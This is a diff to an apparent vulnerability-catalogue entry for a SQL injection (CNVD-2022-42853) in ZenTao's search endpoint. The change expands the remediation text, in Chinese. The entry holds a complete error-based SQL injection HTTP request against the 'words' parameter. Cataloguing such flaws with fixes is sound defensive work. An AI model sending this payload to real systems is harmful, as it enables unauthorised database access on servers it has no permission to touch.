@@ -4,7 +4,7 @@ type = "SQL注入"
 path = "/index.php?m=search&f=index"
 version = "21.4"
 detail = """GET /index.php?m=search&f=index&words=123') AND (SELECT 1474 FROM(SELECT COUNT(*),CONCAT(0x71716a7871,(SELECT (ELT(1474=1474,1))),0x716b716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ErSi&type=all&zin=1 HTTP/1.1 Host: target"""
-fix = "升级至最新版"
+fix = "升级至禅道最新版本（CNVD-2022-42853 已修复）；对 search 模块 words 参数实施参数化查询或预编译处理；限制搜索接口的访问频率；WAF 拦截 SQL 注入特征。"
 date = 20220801
 label = "nday"
 cve = "CNVD-2022-42853"
